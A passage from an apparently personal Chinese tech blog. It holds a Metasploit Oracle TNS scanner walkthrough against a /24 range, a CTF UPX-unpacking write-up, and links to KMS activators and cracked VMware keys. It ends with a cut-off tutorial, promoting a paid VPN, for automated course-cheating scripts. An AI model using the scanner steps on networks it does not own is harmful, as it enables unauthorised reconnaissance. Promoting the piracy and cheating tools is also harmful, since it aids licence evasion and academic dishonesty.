<h3 id="5-Tnslsnr-version-模块"><a href="#5-Tnslsnr-version-模块" class="headerlink" title="5.Tnslsnr_version 模块"></a>5.Tnslsnr_version 模块</h3><h4 id="（1）使用-use-命令使用-tnslsnr-version-模块。"><a href="#（1）使用-use-命令使用-tnslsnr-version-模块。" class="headerlink" title="（1）使用 use 命令使用 tnslsnr_version 模块。"></a>（1）使用 use 命令使用 tnslsnr_version 模块。</h4><p> msf &gt; use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnslsnr_version </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192902843.png"
                      alt="ppp-20231128192902843"
                ></p>
<h4 id="（2）通过-show-命令查看模块的设置选项。-4"><a href="#（2）通过-show-命令查看模块的设置选项。-4" class="headerlink" title="（2）通过 show 命令查看模块的设置选项。"></a>（2）通过 show 命令查看模块的设置选项。</h4><p> msf auxiliary(tnslsnr_version) &gt; show options</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192919281.png"
                      alt="ppp-20231128192919281"
                ></p>
<h4 id="（3）使用-set-命令设置目标地址范围。-4"><a href="#（3）使用-set-命令设置目标地址范围。-4" class="headerlink" title="（3）使用 set 命令设置目标地址范围。"></a>（3）使用 set 命令设置目标地址范围。</h4><p> msf auxiliary(tnslsnr_version)&gt; set RHOSTS 10.10.10.0&#x2F;24</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192949628.png"
                      alt="ppp-20231128192949628"
                ></p>
<h4 id="（4）使用-set-命令设置并发线程的数量。-3"><a href="#（4）使用-set-命令设置并发线程的数量。-3" class="headerlink" title="（4）使用 set 命令设置并发线程的数量。"></a>（4）使用 set 命令设置并发线程的数量。</h4><p> msf auxiliary(tnslsnr_version) &gt; set THREADS 50</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128193004063.png"
                      alt="image-20231128193004063"
                ></p>
<h4 id="（5）使用-run-命令来执行扫描。-3"><a href="#（5）使用-run-命令来执行扫描。-3" class="headerlink" title="（5）使用 run 命令来执行扫描。"></a>（5）使用 run 命令来执行扫描。</h4><p> msf auxiliary(tnslsnr_version) &gt; run</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128193019150.png"
                      alt="ppp-20231128193019150"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>网络服务扫描实验</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>网络服务扫描实验</tag>
      </tags>
  </entry>
  <entry>
    <title>网络部培训资料</title>
    <url>/posts/fcddcde4.html</url>
    <content><![CDATA[<blockquote>
<p><strong>前排提示：在计算机的学习道路上，自学能力很重要，优秀的自学能力会引导你不断地获取新知识，加油，少年，当你有兴趣点开这一页，就意味着你会成为你心里的大佬的。</strong></p>
<p>遇到不会的问题，先尝试搜索，搜索引擎推荐 Google(需要科学上网) &gt; bing &gt; 其他</p>
<p>如果搜不到再尝试问，提问的时候要保证提供尽可能多的报错、截图等信息</p>
</blockquote>
<blockquote>
<p>本篇仅做 <strong>引导</strong>，本篇知识不仅可用于应付网络部培训，更深层的是学习一些计算机知识技能，以 <strong>提升自己</strong></p>
</blockquote>
<h2 id="计算机各种硬件的作用"><a href="#计算机各种硬件的作用" class="headerlink" title="计算机各种硬件的作用"></a>计算机各种硬件的作用</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/353275581#/" >电脑各个硬件的作用 - 知乎 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/186180430#/" >硬件基础：电脑当中各个硬件的作用介绍 - 知乎 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>挺好的 B 站专栏系列视频 ↓</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV19g4y1z7Cx/" >【最最基础的电脑硬件科普】第一期——CPU 篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1mA411t7MG/" >【最最基础的电脑硬件科普】第二期——CPU 散热器篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1Lv411z7em/" >【最最基础的电脑硬件科普】第三期——显卡篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1VC4y1h7kJ/" >【最最基础的电脑硬件科普】第四期——硬盘篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1pi4y1M7rB/" >【最最基础的电脑硬件科普】第五期——内存篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1Qz4y1m7ad/" >【最最基础的电脑硬件科普】第六期——主板篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="IP-地址知识"><a href="#IP-地址知识" class="headerlink" title="IP 地址知识"></a>IP 地址知识</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/363974506#/" >计算机网络基础：IP 基础知识笔记 - 知乎 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>拓展知识：<a class="link"   href="https://blog.csdn.net/m0_56494923/article/details/127775055#/" >计算机网络 - IPv4 常考知识点详解(超详细！)_ipv4 分组-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（比较深度，不需要全会，了解即可，<strong>提醒一下这是计算机网络的必修知识点，需要必修计算机网络的同学可以提前学习，子网划分是必考大题</strong>）</p>
<h2 id="硬盘内存等"><a href="#硬盘内存等" class="headerlink" title="硬盘内存等"></a>硬盘内存等</h2><p><a class="link"   href="https://blog.csdn.net/abraham76/article/details/122023934#/" >内存、外存、硬盘、磁盘、闪存，傻傻分不清？_硬盘内存是 ddr3 吗-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/read/cv34336932/#/" >小白科普：想不清楚内存与硬盘有啥区别？读完这篇就懂了 - 哔哩哔哩 (bilibili.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/688125485#/" >三款知名度很高的解压软件：7-Zip、WinRAR、Bandizip - 知乎 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Github-的注册使用"><a href="#Github-的注册使用" class="headerlink" title="Github 的注册使用"></a>Github 的注册使用</h2><p>这里提一点 Github 的访问，由于 Github 在国内属于半墙状态，所以不得不通过一些工具进行加速</p>
<p><a class="link"   href="https://steampp.net/#/" >瓦特工具箱(Steam++官网) - Watt Toolkit (steampp.net)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>瓦特工具箱最初是用于加速 Steam 后来也支持加速 Github，并且是合法合规的软件，且完全免费，可以使用这个工具解决访问问题，以及 Git 的代码推送，代码克隆等</p>
<blockquote>
<p>不过在某种情况下，也许需要和某种“工具”配合使用（一种可以访问国内无法访问的工具，由于内容涉敏这里不多说，有需要可以单独找我）</p>
</blockquote>
<h2 id="office-激活"><a href="#office-激活" class="headerlink" title="office 激活"></a>office 激活</h2><p>重点：KMS 激活工具的使用</p>
<p><a class="link"   href="https://otp.landian.vip/zh-cn/#/" >Office Tool Plus | 一键部署 Office (landian.vip)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/zbezj/HEU_KMS_Activator/releases#/" >Releases · zbezj&#x2F;HEU_KMS_Activator (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="系统重装篇"><a href="#系统重装篇" class="headerlink" title="系统重装篇"></a>系统重装篇</h2><p><a class="link"   href="https://www.zhihu.com/tardis/zm/art/108156241?source_id=1005#/" >手把手教你如何重装 win10 系统，自己动手安装系统其实很简单 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="分盘"><a href="#分盘" class="headerlink" title="分盘"></a>分盘</h2><ol>
<li><p><a class="link"   href="https://blog.csdn.net/shujuwa_data/article/details/128964986#/" >电脑分盘怎么分？分盘详细教程来了，图文教学-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>借助第三方工具：<a class="link"   href="https://www.disktool.cn/download.html#/" >下载分区助手 (disktool.cn)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ol>
<h2 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h2><p><a class="link"   href="https://diskgenius.cn/exp/use-tutorial.php#/" >DiskGenius 数据恢复详细教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.diskgenius.cn/download.php#/" >DiskGenius – 正式版下载|免费下载<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="PE-系统"><a href="#PE-系统" class="headerlink" title="PE 系统"></a>PE 系统</h2><p>仅用于了解什么是 PE：<a class="link"   href="https://zhuanlan.zhihu.com/p/21781340#/" >电脑高手必备 - 什么是 PE？ - 知乎 (zhihu.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>推荐 PE 系统：<a class="link"   href="https://www.cnblogs.com/ccav1/p/14015190.html#/" >Ventoy+WePE 装机教程 - 逍遥隐士 - 博客园 (cnblogs.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="VMware-Workstation-虚拟机合集-激活密钥"><a href="#VMware-Workstation-虚拟机合集-激活密钥" class="headerlink" title="VMware Workstation 虚拟机合集+激活密钥"></a>VMware Workstation 虚拟机合集+激活密钥</h2><p><a class="link"   href="https://www.52pojie.cn/thread-1804571-1-1.html#/" >VMware Workstation 虚拟机合集+激活密钥_Win+Linux_10∕11∕12∕14∕15∕16∕17 - 吾爱破解 - 52pojie.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>网络部</category>
      </categories>
      <tags>
        <tag>网络部</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Github actions的学习</title>
    <url>/posts/dce14753.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事情是怎么一回事呢，一直以来，我的 Easy-QFNU 的日期更新因为插件不适配，导致日期我一直没用，就自己手搓的日期编辑，硬解码，一开始是手动编辑，后来感觉效率太低了，就搓了个 Python 脚本来实现批量更新，但是后来又觉得不够灵活，就想着用 Github actions 来实现自动化执行脚本来更新，正好看到了探姬师傅的 Hello-CTF 的 Github 仓库里也用了 Github actions，就想着也试试。</p>
<p>前前后后搞了十多天吧，在这期间，遇到了各种各样的奇奇怪怪的 bug，最终解决，能正常运行的时候，我欣喜若狂，我都不知道我有多高兴，从来没这么高兴过。</p>
<h2 id="结局"><a href="#结局" class="headerlink" title="结局"></a>结局</h2><p>虽然最后给社区分享了一下，社区维护人员给了我一种更好的解决办法，可以说是更加完美平替了，采用了他的方法，这十天也就是说白白浪费了</p>
<p>其实也不能算白白浪费吧，毕竟对 Github actions 更加熟悉了一些，学到了一些东西，也算是对自己能力的一种考验吧。</p>
<p>这份脚本我也留档了，有需要的可以参考一下，希望能帮到你。</p>
<h2 id="脚本及其教程"><a href="#脚本及其教程" class="headerlink" title="脚本及其教程"></a>脚本及其教程</h2><p>脚本及其教程在这里：<a href="https://blog.w1ndys.top/posts/512a6b20">关于 Mkdocs-material 日期显示不准确的一种平替方法</a></p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>ChatGPT</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次不一样的UPX脱壳</title>
    <url>/posts/44452f5b.html</url>
    <content><![CDATA[<h1 id="记一次不一样的-UPX-脱壳"><a href="#记一次不一样的-UPX-脱壳" class="headerlink" title="记一次不一样的 UPX 脱壳"></a>记一次不一样的 UPX 脱壳</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上打 LitCTF 的时候有个 hello_upx 题，一开始以为只是简单的工具脱壳，没想到 <code>upx -d</code> 没成功，报错 <code>upx: hello_upx.exe: CantUnpackException: file is possibly modified/hacked/protected; take care!</code></p>
<p>然后就搜了一下这个报错，找到了这篇文章：<a class="link"   href="https://blog.csdn.net/hanxuer_/article/details/106549548#/" >记一次没遇到过的 UPX 脱壳<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>长知识了，原因是 UPX 加壳的文件被修改了，导致无法正常脱壳</p>
<h2 id="脱壳过程"><a href="#脱壳过程" class="headerlink" title="脱壳过程"></a>脱壳过程</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CTF-Reverse-UPX-Litctf/image-20240601165151233.png"
                      alt="image-20240601165151233"
                ></p>
<p>一开始脱壳失败，经过查资料发现解法</p>
<p>拉进 winhex 发现文件被修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CTF-Reverse-UPX-Litctf/image-20240601165348142.png"
                      alt="image-20240601165348142"
                ></p>
<p>正常的文件应该是大写的<code>UPX</code></p>
<p>修改之后保存文件</p>
<p>再用工具<code>upx -d</code> 脱壳即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CTF-Reverse-UPX-Litctf/image-20240601165451837.png"
                      alt="image-20240601165451837"
                ></p>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CTF-Reverse-UPX-Litctf/image-20240601165532103.png"
                      alt="image-20240601165532103"
                ></p>
<p>分析可得，flag 就是 v4+i</p>
<p>EXP:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v4 = <span class="string">&quot;Lhr@PAup+cY%aXQe NZ\x1E`N^Oe&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    v5 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v4[i]) + i)</span><br><span class="line"><span class="built_in">print</span>(v5)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>逆向工程</tag>
        <tag>UPX</tag>
        <tag>脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Windows11“为了对电脑进行保护，已经阻止此应用。”</title>
    <url>/posts/8847716f.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows/image-20231208221039318.png"
                      alt="image-20231208221039318"
                ></p>
<p>有时候安装客户端的时候会遇到这种情况</p>
<p>然而网上的方法对于家庭版电脑并不适用</p>
<p>但是我们可以通过命终端来解决</p>
<p>首先右键开始菜单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows/image-20231208221525986.png"
                      alt="image-20231208221525986"
                ></p>
<p>点击<font color='red'>Windows终端（管理员）</font></p>
<p>一定要选择管理员终端</p>
<p>然后切换到exe所在的目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows/image-20231208221942022.png"
                      alt="image-20231208221942022"
                ></p>
<p>然后输入待安装文件名（不要丢掉后缀名）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows/image-20231208222008686.png"
                      alt="image-20231208222008686"
                ></p>
<p>结束！祝你学得开心！</p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次文件恢复</title>
    <url>/posts/bd3810d9.html</url>
    <content><![CDATA[<p>今天晚上刷 Python 题的时候突然想找出视频来看看，打开硬盘发现找不到文件在哪， 忘记放哪里去了</p>
<p>拿出 everything 搜一下，发现全进了一个名为 <code>found.000</code> 的文件夹，直接打开显示拒绝访问，那就是权限不够呗，准备提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202185053893.png"
                      alt="image-20240202185053893"
                ></p>
<p>我也不知道文件为什么被塞进隐藏文件夹了，既然直接访问没权限。首先试一下能不能把隐藏目录给整出来</p>
<p>浏览器里看一下是可以看到存在三个隐藏文件夹的，至于另外三个，也是被隐藏了，但我还没察觉到，不知道是什么文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202190110551.png"
                      alt="image-20240202190110551"
                ></p>
<p>看一下三个文件的修改日期</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">| [found.000/]() |      | 2024/1/18 20: 09: 12 |</span><br><span class="line">| [found.001/]() |      | 2024/1/23 15: 53: 30 |</span><br><span class="line">| [found.002/]() |      | 2024/1/24 12: 56: 30 |</span><br></pre></td></tr></table></figure></div>

<p>看来不是同一次出现的。</p>
<p>直接进看不到任何文件，浏览器的权限也不够</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202190313953.png"
                      alt="image-20240202190313953"
                ></p>
<p>bing 查一下用 bash 应该可以</p>
<p>bash 带管理员模式启动，看了一下可以扫到隐藏文件夹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202190635383.png"
                      alt="image-20240202190635383"
                ></p>
<p>先把文件复制出来再说</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp found.000  recovery -r</span><br></pre></td></tr></table></figure></div>

<p>关于 Linux 的 cp 命令</p>
<p><a class="link"   href="https://www.runoob.com/linux/linux-comm-cp.html#/" >https://www.runoob.com/linux/linux-comm-cp.html#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>文件应该是都拿出来了，把原来的文件夹删掉就行了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202191625392.png"
                      alt="image-20240202191625392"
                >、</p>
<p>搜了一下为什么会生成这些文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202191934777.png"
                      alt="image-20240202191934777"
                ></p>
<p>还好不是碎片化文件，看来物理存储介质也不是万无一失的</p>
<p>所以到底是为什么数据会产生这些情况</p>
<p>我想起来前几天电脑会突然响设备断连的警报声，可能是我的拓展坞不太行，但是绿联的问题应该不大吧。以后直接在电脑 TypeC 口插着吧，拓展坞不能用来数据传输，不太安全。</p>
<p>最后把那些文件复制出来，看了一下也没啥用，先留着</p>
<p>直接 rm -rf 把隐藏的文件给删掉了，省的占用空间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202194922142.png"
                      alt="image-20240202194922142"
                ></p>
<p>最后也是虚惊一场，50个G的文件差点没了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/recovery_note/image-20240202195444290.png"
                      alt="image-20240202195444290"
                ></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>应急响应</tag>
        <tag>文件恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>超星学习通/刷课脚本安装教程</title>
    <url>/posts/12c45bcf.html</url>
    <content><![CDATA[<blockquote>
<p>新的刷课脚本已更新，强烈建议用新的，并把本脚本结合使用，效果最佳，传送门：<a href="https://blog.w1ndys.top/posts/1ff200e1">https://blog.w1ndys.top/posts/1ff200e1</a></p>
</blockquote>
<blockquote>
<p>前言：使用本工具请自觉遵守国家法律法规，下载后请 24 小时之内删除，本教程来自 <a class="link"   href="http://www.w1ndys.top/" >www.w1ndys.top<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><u> 使用 </u> 本教程即代表用户同意本教程 <a href="#%E7%94%A8%E6%88%B7%E5%8D%8F%E8%AE%AE">用户协议</a>，使用本教程造成的 <font color='red'> 一切后果由个人承担 </font>，<u> 作者 </u> <font color='red'> 概不负责 </font></p>
<p><font color='red'> 请注意：本教程所涉新的本工具开发者并不是博主本人，内涵涉及收费的内容，请酌情考虑 </font></p>
<p>本教程编写于 2023 年 11 月 3 日，距离时间过长可能脚本已失效，请铭记</p>
<p>本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任</p>
</blockquote>
<p>本教程编写耗时 <font color='red'> 160 分钟 </font> 且浏览完全免费，且看且珍惜</p>
<br/>

<p><font color='red'> 更新：如果本文章使用次数耗尽而且不想买，又或者也有知到智慧树相关需求，</font> 可以移步 <a class="link"   href="https://w1ndys.top/2023/11/03/zhs-plus/#" >智慧树&#x2F;知到&#x2F;刷课脚本安装教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可继续获得 100 次免费答题</p>
<br/>

<h1 id="作者建议"><a href="#作者建议" class="headerlink" title="作者建议"></a>作者建议</h1><p>建议在阳间的时间刷课，后台可以看到浏览时间的</p>
<h1 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h1><ol>
<li><p>一台能上网的电脑</p>
</li>
<li><p>Google Chrome（推荐）</p>
<p>没有 Google 的可以用 Windows 自带的 Edge 浏览器（</p>
</li>
<li><p>脚本猫（用篡改猴也行，本教程以脚本猫为例</p>
<p>详情：<a class="link"   href="https://docs.scriptcat.org/docs/use/#/" >脚本猫使用文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>一个魔法工具（梯子）</p>
<p><font color="#3333FF"> 需要特别注意的是，使用本工具有一定的流量计费，3.8-38.8 不等，根据自己需要选择 </font>，此费用也不是我本人收取，而是流量的提供方收取，特别注意这点 <font color="#FF0000" size=5> 如果你介意此费用，你可以关闭此页面退出阅读了。</font> <span style="color:#FFFF00; font-size:1.2em;"> 如果你自己有梯子可以忽略这一步 </span> 具体注意事项下面会提到</p>
</li>
<li><p>OCS 客户端</p>
</li>
<li><p>一个懂的百度的大脑（不是</p>
</li>
<li><p>一双灵敏的眼睛（不是</p>
</li>
<li><p>一个耐心看教程的好习惯（不是</p>
</li>
<li><p>一颗真诚的心和 <font color='red'> 良好的态度 </font>，有问题 <a class="link"   href="https://qm.qq.com/q/9n506oZ8Ri&personal_qrcode_source=4" >联系博主<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>（实在懒得弄可以找我低价代刷</p>
</li>
</ol>
<h1 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h1><p>有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………</p>
<h2 id="爬墙工具的介绍和安装使用"><a href="#爬墙工具的介绍和安装使用" class="headerlink" title="爬墙工具的介绍和安装使用"></a>爬墙工具的介绍和安装使用</h2><p><span style="color:#FF0000; font-size:1.1em;"> 如果你自己有梯子可以忽略这一步 </span></p>
<p><span style="color:#FF0000; font-size:1.1em;"> 如果你自己有梯子可以忽略这一步 </span></p>
<p><span style="color:#FF0000; font-size:1.1em;"> 如果你自己有梯子可以忽略这一步 </span></p>
<p><span style="color:#FF0000; font-size:1.1em;"> 如果你自己有梯子可以忽略这一步 </span></p>
<p>有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………</p>
<h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p><font color="#FF3333"> 这些你都不需要记，看看就行 </font></p>
<p>​        虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。</p>
<p>　　如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。</p>
<p>　　通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。</p>
<h3 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h3><p>微信搜索公众号关注：  <code>W1ndys_Official</code>  点击下方菜单 GPT 可获取注册地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/wx.png"
                      alt="注册"
                ></p>
<p>输入邮箱密码注册账号，注册完成后登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7.png"
                      alt="注册"
                ></p>
<p>然后点击左侧购买订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%AE%A2%E9%98%85.png"
                      alt="订阅"
                ></p>
<p>根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%B4%AD%E4%B9%B0%E8%AE%A2%E9%98%85.png"
                      alt="购买订阅"
                ></p>
<p>我本人用的是 <font color="#FF0000"> 38.8 巨量不限时，推荐这个 </font>，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天</p>
<blockquote>
<p>因为我不只有这一个需求，另外还有使用 <font color="#FF0000"> ChatGPT，bingai </font> 等的需求，所以这个是最划算的。</p>
</blockquote>
<p>另外关于如何使用 ChatGPT 的教程以后有时间我会写，OpenAI 官方的 ChatGPT</p>
<p>买完之后点击左上方仪表盘可以看到你的已订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E4%BB%AA%E8%A1%A8%E7%9B%98.png"
                      alt="仪表盘"
                ></p>
<p>然后点击仪表盘下方的使用文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%A2%E6%88%B7%E7%AB%AF.png"
                      alt="客户端安装"
                ></p>
<p>选择你的系统安装客户端</p>
<p>安装完之后登陆客户端就可以看到这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.png"
                      alt="安装完成"
                ></p>
<h3 id="连接节点"><a href="#连接节点" class="headerlink" title="连接节点"></a>连接节点</h3><p>目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局，<font color="#FF0000"> 如果后续出现连接失败就换个节点 </font></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%8A%82%E7%82%B9.png"
                      alt="节点"
                ></p>
<h2 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h2><p>首先安装脚本猫，点击进入 <a class="link"   href="https://docs.scriptcat.org/docs/use/#/" >脚本猫使用文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/1.jpg"
                      alt="安装脚本猫"
                ></p>
<p>根据自己浏览器选择安装，这里以 Google Chrome 为例</p>
<p>（如果长时间进不去则需要 <font color='red'> 科学上网 </font>，由于种种原因这里不过多赘述）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/2.jpg"
                      alt="安装脚本猫"
                ></p>
